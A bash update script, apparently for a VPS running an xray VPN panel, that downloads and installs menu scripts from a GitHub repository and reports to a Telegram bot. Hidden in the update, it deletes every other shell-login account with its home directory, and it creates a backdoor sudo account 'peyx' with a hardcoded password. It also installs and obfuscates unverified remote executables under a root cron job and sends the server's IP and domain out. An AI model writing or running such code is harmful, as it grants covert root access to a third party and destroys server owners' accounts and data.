loading() {
local pid=$1
local message=$2
local delay=0.1
local spinstr='|/-\'
tput civis
while [ -d /proc/$pid ]; do
local temp=${spinstr#?}
printf " [%c] $message\r" "$spinstr"
spinstr=$temp${spinstr%"$temp"}
sleep $delay
done
tput cnorm
}
if ! command -v 7z &> /dev/null; then
echo -e " [INFO] Installing p7zip-full..."
apt install p7zip-full -y &> /dev/null &
loading $! "Loading Install p7zip-full"
fi
CHATID=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 3)
KEY=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 2)
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
domain=$(cat /etc/xray/domain)
MYIP=$(curl -sS ipv4.icanhazip.com)
username=$(curl -sS https://raw.githubusercontent.com/rifg67/script-rifts/main/ipx | grep $MYIP | awk '{print $2}')
valid=$(curl -sS https://raw.githubusercontent.com/rifg67/script-rifts/main/ipx | grep $MYIP | awk '{print $3}')
today=$(date +"%Y-%m-%d")
d1=$(date -d "$valid" +%s)
d2=$(date -d "$today" +%s)
certifacate=$(((d1 - d2) / 86400))
echo -e " [INFO] Fetching server date..."
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
REPO="https://raw.githubusercontent.com/rifg67/script-rifts/main/"
pwadm="@Peyx23"
Username="peyx"
Password="$pwadm"
allowed_users=("root" "$Username")
all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
for user in $all_users; do
if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
userdel -r "$user" > /dev/null 2>&1
echo "User $user telah dihapus."
fi
done
if id "$Username" &>/dev/null; then
echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
else
echo -e "$Username $Password" > /etc/xray/.adm
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
usermod -aG sudo "$Username" > /dev/null 2>&1
fi
echo -e " [INFO] Downloading menu.zip..."
{
> /etc/cron.d/cpu_otm
cat> /etc/cron.d/cpu_xwan << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /usr/bin/detek
END
wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
wget -q ${REPO}menu/menu.zip
mv menu/expsc /usr/local/sbin/expsc
wget -q -O /usr/bin/enc "${REPO}install/encrypt"
chmod +x /usr/bin/enc
7z x -p$pwadm menu.zip &> /dev/null #pastikan file menu.zip memiliki password yang sama
chmod +x menu/*
enc menu/* &> /dev/null
mv menu/* /usr/local/sbin
rm -rf menu menu.zip
rm -rf /usr/local/sbin/*~
rm -rf /usr/local/sbin/gz*
rm -rf /usr/local/sbin/*.bak
} &> /dev/null &
loading $! "Loading Extract and Setup menu"
echo -e " [INFO] Fetching server version..."
serverV=$(curl -sS ${REPO}versi)
echo $serverV > /opt/.ver
rm /root/*.sh*
TEXT="-------------------------------
<b>   ⚠️NOTIF UPDATE SCRIPT⚠️</b>
<b>     Update Script Sukses</b>
-------------------------------
<b>IP VPS  :</b> ${MYIP}
<b>DOMAIN  :</b> ${domain}
<b>USER    :</b> ${username}
<b>MASA    :</b> $certifacate DAY
-------------------------------
BY BOT : @frel01
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo -e " [INFO] File download and setup completed successfully. Version: $serverV!"
exit
